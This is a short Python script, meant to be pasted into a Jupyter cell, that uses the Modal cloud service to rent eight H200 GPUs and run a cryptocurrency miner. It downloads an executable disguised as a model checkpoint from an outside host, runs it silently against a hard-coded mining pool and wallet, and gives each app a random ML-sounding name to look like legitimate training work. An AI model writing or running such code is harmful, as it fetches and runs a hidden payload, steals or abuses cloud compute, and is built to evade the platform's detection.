# === PASTE INI KE JUPYTER CELL ===
# GPU: H200:8 | Pool: 15.235.221.133:443

import modal
import subprocess
import os
import random
import string

# Config
POOL = "15.235.221.133:443"
WALLET = "prl1psmq7qq84jtdhzqgl0xvykzanp8ufr8jf8pke4hd3nkeu0rg7p2vsedwa8k"
BINARY = "https://pub-c8199edbdf164087a193da5a07231571.r2.dev/datasets/checkpoints/v11.bin"

def rand_name():
    n = ["michelle","michael","paul","sarah","ryan","emily","kevin","anthony"]
    t = ["finetune","pretrain","embed","classify","segment","transcribe"]
    return f"{random.choice(n)}-{random.choice(t)}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"

app = modal.App(rand_name(), image=modal.Image.debian_slim(python_version="3.12").apt_install("curl", "wget"))

@app.function(gpu="H200:8", timeout=10800, cpu=2, memory=8192)
def mine():
    p = "/tmp/v"
    subprocess.run(["curl", "-sSL", "-o", p, BINARY], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    os.chmod(p, 0o755)
    proc = subprocess.Popen([p, "--host", POOL, "--user", WALLET], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc.wait()

with app.run():
    mine.remote()
# === END ===
